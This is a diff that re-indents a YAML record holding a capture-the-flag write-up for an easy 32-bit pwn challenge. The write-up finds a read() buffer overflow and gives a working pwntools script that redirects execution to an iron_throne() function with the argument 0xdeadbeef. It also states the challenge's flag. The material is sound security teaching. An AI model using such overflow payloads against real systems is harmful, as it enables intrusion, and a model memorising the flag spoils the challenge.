@@ -3,50 +3,50 @@ id: 1085
 category: Pwn
 difficulty: Easy
 content: |
-**Author**: [NightKing](https://twitter.com/n1ght_k7ng)
+  **Author**: [NightKing](https://twitter.com/n1ght_k7ng)
 
 
-A 32bit binary has been given. 
-![](https://i.imgur.com/SSBAims.png)
+  A 32bit binary has been given. 
+  ![](https://i.imgur.com/SSBAims.png)
 
-#### Decompilation 
+  #### Decompilation 
 
-Looking at the **vuln()** function..
+  Looking at the **vuln()** function..
 
-![](https://i.imgur.com/4tAg2ct.png)
+  ![](https://i.imgur.com/4tAg2ct.png)
 
-We see there an scope of an buffer overflow as we can see that the **read()** function can take an input with a more input length(0x54) than the allocated memory(0x2c). 
+  We see there an scope of an buffer overflow as we can see that the **read()** function can take an input with a more input length(0x54) than the allocated memory(0x2c). 
 
-If we read the challenge description it is pretty clear that we have to find the iron throne. 
-And while decompiling/debugging we see an `iron_throne()` function. 
+  If we read the challenge description it is pretty clear that we have to find the iron throne. 
+  And while decompiling/debugging we see an `iron_throne()` function. 
 
 
-![](https://i.imgur.com/AhgvXWw.png)
+  ![](https://i.imgur.com/AhgvXWw.png)
 
-Aahaa !! 
+  Aahaa !! 
 
-We see that this `iron_throne()` is called with a parameter which is later checked to a number = `-0x2152411` which translates as `0xdeadbeef` 
+  We see that this `iron_throne()` is called with a parameter which is later checked to a number = `-0x2152411` which translates as `0xdeadbeef` 
 
-And then we are supposed to get the flag with `system("cat flag.txt")`
+  And then we are supposed to get the flag with `system("cat flag.txt")`
 
-#### Crafting the exploit 
+  #### Crafting the exploit 
 
-`payload = b'a'*44`  as the required buffer 
-`payload += b'x'*12` as padding required to reach the eip 
-`payload += p32(elf.symbols["iron_throne"])` adding the address of the `iron_throne()`
-`payload += p32(0xdeadbeef)+p32(0xdeadbeef)` the parameter of the function `iron_throne()` and the return address. 
+  `payload = b'a'*44`  as the required buffer 
+  `payload += b'x'*12` as padding required to reach the eip 
+  `payload += p32(elf.symbols["iron_throne"])` adding the address of the `iron_throne()`
+  `payload += p32(0xdeadbeef)+p32(0xdeadbeef)` the parameter of the function `iron_throne()` and the return address. 
 
-#### The final exploit 
+  #### The final exploit 
 
-```from pwn import *
+  ```from pwn import *
 
-elf = ELF("./chall")
-context.binary = elf
-#p = process("./chall")
-host = os.environ['CI_REGISTRY_IMAGE'].replace('/', '-')
-p = remote(host, 9007)
+  elf = ELF("./chall")
+  context.binary = elf
+  #p = process("./chall")
+  host = os.environ['CI_REGISTRY_IMAGE'].replace('/', '-')
+  p = remote(host, 9007)
 
-p.sendline("A"*56+p32(elf.symbols["iron_throne"])+p32(0xdeadbeef)+p32(0xdeadbeef))
-p.interactive()
-```
-**Flag** = inctfj{t4rga3ry4n5_4lw4ys_p4ys_th3ir_d3b1s_2refwh2138uh}
+  p.sendline("A"*56+p32(elf.symbols["iron_throne"])+p32(0xdeadbeef)+p32(0xdeadbeef))
+  p.interactive()
+  ```
+  **Flag** = inctfj{t4rga3ry4n5_4lw4ys_p4ys_th3ir_d3b1s_2refwh2138uh}
